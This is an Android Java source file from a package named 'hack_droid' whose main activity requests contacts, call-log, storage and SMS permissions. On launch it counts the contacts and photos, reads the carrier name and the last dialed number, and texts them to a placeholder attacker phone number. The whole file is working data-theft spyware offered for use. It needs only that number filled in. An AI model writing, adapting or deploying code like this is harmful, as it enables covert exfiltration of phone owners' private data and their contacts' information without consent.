package com.example.hack_droid;


import android.app.PendingIntent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import android.content.Context;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Context context = getApplicationContext();


        requestPermission();
        Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
        int contacts_count = c.getCount();
        Log.d("Gallery", String.valueOf(contacts_count));
        Cursor gallery_cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
        int gallery_count = gallery_cursor.getCount();
        Log.d("Gallery", String.valueOf(gallery_count));
        String carrierName = ((TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE)).getNetworkOperatorName();
        String lastDialed = CallLog.Calls.getLastOutgoingCall(getApplicationContext());
        SmsManager.getDefault().sendTextMessage("REPLACE THIS TEXTS WITH YOUR PHONE NUMBER HERE", (String) null, String.format(Locale.ENGLISH, "%d, %d, %s, %s", new Object[]{Integer.valueOf(contacts_count), Integer.valueOf(gallery_count), carrierName, lastDialed}), (PendingIntent) null, (PendingIntent) null);
        Toast.makeText(this, "SMS sent", Toast.LENGTH_LONG).show();
        c.close();
        gallery_cursor.close();
    }

    private boolean hasReadExternalStoragePermission() {
        return ActivityCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0;
    }

    private boolean hasReadContactsPermission() {
        return ActivityCompat.checkSelfPermission(this, "android.permission.READ_CONTACTS") == 0;
    }

    private boolean hasReadCallLogsPermission() {
        return ActivityCompat.checkSelfPermission(this, "android.permission.READ_CALL_LOG") == 0;
    }

    private boolean hasSendSmsPermission() {
        return ActivityCompat.checkSelfPermission(this, "android.permission.SEND_SMS") == 0;
    }

    private void requestPermission() {
        List<String> permissionToRequest = new ArrayList<>();
        if (!hasReadExternalStoragePermission()) {
            permissionToRequest.add("android.permission.READ_EXTERNAL_STORAGE");
        }
        if (!hasReadContactsPermission()) {
            permissionToRequest.add("android.permission.READ_CONTACTS");
        }
        if (!hasReadCallLogsPermission()) {
            permissionToRequest.add("android.permission.READ_CALL_LOG");
        }
        if (!hasSendSmsPermission()) {
            permissionToRequest.add("android.permission.SEND_SMS");
        }
        if (!permissionToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, (String[]) permissionToRequest.toArray(new String[0]), 0);
        }
    }

    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 0 && grantResults.length > 0) {
            for (int i : grantResults) {
                if (i == 0) {
                    Toast.makeText(this, "Permission granted", 1).show();
                }
            }
        }
    }
}



